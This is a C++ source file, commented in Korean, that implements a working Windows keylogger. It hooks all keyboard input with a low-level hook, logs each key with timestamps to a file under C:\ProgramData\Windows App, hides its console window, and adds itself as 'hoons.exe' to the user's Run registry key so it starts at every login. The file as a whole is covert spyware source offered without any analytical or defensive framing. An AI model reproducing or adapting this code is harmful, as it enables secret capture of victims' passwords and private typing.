#define _CRT_SECURE_NO_WARNINGS 
#include <bits/stdc++.h>
#include <Windows.h>
#include <WinUser.h>
#include <signal.h>
#include <shlobj.h>
#include <iostream>
#include <unordered_map>

int prevKey = -1;
HHOOK keyboardHook;
FILE* logFile;
time_t prevTime = time(NULL); // 이전에 키를 누른 시간을 저장할 변수
bool first = false;

//VKCode에 해당하는 키 이름을 반환하는 함수
char* GetKeyNameFromVKCode(int vkCode) {
    static char keyName[256];
    int scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    int result = GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName));

    //키 값에해당하는 문자열을 못찾았을경우
    if (result == 0)
        strcpy(keyName, "UNKNOWN");

    //키 값에 해당하는 문자열을 전부 대문자로 변환
    for (int i = 0; keyName[i] != '\0'; i++)
        keyName[i] = toupper(keyName[i]);

    //찾은 문자열을 반환
    return keyName;
}

//log.txt에 기록하는 함수
void WriteToLogFile(const char* message) {
    fprintf(logFile, "%s", message);
    fflush(logFile);
}

//키보드 후킹 함수
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    const double interval = 1.5; //키 입력간 간격을 1.5초로 설정

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        int vkCode = p->vkCode;

        if (wParam == WM_KEYDOWN) {
            if (prevKey != vkCode) {
                //키를 누른 시간과 현재 시간의 차이를 계산
                time_t currentTime = time(NULL);
                double diff = difftime(currentTime, prevTime);

                //시간정보 구하기
                char timeString[128];
                struct tm* localTime;
                time(&currentTime);
                localTime = localtime(&currentTime);
                strftime(timeString, sizeof(timeString), "[%Y-%m-%d %H:%M:%S] ", localTime);

                //가상키를 읽을 수 있는 문자로 치환
                char keyName[32];
                strcpy(keyName, GetKeyNameFromVKCode(vkCode));

                //log.txt에 저장할 문자열
                char logMessage[128];
                if (first) { //처음 기록을 시작할때 시간정보와 입력키 기록
                    first = !first;
                    sprintf(logMessage, "%s%s", timeString, keyName);
                }
                else if (diff <= interval) { //키 입력 간격이 1.5초 이하면
                    //입력키만 기록
                    sprintf(logMessage, "%s", keyName);
                }
                else { //키 입력 간격이 1.5초 초과하면
                    //이전에 log.txt에 쓴내용과 줄바꿈하면서 새로운 줄에 시간정보와 입력키 기록
                    sprintf(logMessage, "\n%s%s", timeString, keyName);
                }

                //실제 log.txt에 기록하는 명령
                WriteToLogFile(logMessage);

                // 현재 시간을 이전에 키를 누른 시간으로 설정
                prevTime = currentTime;
            }
            //이전 입력키를 저장
            prevKey = vkCode;
        }
        else if (wParam == WM_KEYUP) {
            //키를 떼면 이전 입력키를 초기화하여 같은키의 여러번 눌림을 기록
            prevKey = -1;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}



//프로그램 종료 시그널 핸들러
void SignalHandler(int signal) {
    fclose(logFile);
    exit(0);
}

//프로그램 종료 시 그동안의 로그를 기록하는 함수
void WriteRemainingLog() {
    fflush(logFile);
}

//프로그램 진입점
int main() {
    //시작프로그램 레지스트리에 등록
    const char* path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    //시작프로그램 레지스트리 항목 이름
    const char* name = "hoons";

    //프로그램 실행 경로
    const char* executablePath = "C:\\ProgramData\\Windows App\\hoons.exe";

    //레지스트리 키 생성
    HKEY hKey;
    LONG createStatus = RegCreateKeyExA(HKEY_CURRENT_USER, path, 0, nullptr, REG_OPTION_VOLATILE, KEY_WRITE, nullptr, &hKey, nullptr);
    if (createStatus != ERROR_SUCCESS) {
       //레지스트리 키 생성에 실패한경우
    }

    //레지스트리 항목 값 설정
    LONG setValueStatus = RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE*)executablePath, strlen(executablePath) + 1);
    if (setValueStatus != ERROR_SUCCESS) {
        //레지스트리값 설정에 실패한경우
    }

    // 레지스트리 키 닫기
    RegCloseKey(hKey);

    
    //프로그램이 실행될 때, 명령 프롬프트 창이 뜨지 않도록 설정
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    logFile = fopen("C:\\ProgramData\\Windows App\\log.txt", "a");
    if (logFile == NULL) {
        logFile = fopen("C:\\ProgramData\\Windows App\\log.txt", "w");
        if (logFile == NULL) {
            printf("Failed to create log file.\n");
            return 1;
        }
    }


    //프로그램 종료 시그널 핸들러 등록
    signal(SIGINT, SignalHandler);

    //프로그램 종료 시 그동안의 로그를 기록하도록 atexit 함수 등록
    atexit(WriteRemainingLog);

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0);
    UnhookWindowsHookEx(keyboardHook);

    fclose(logFile);
    return 0;
}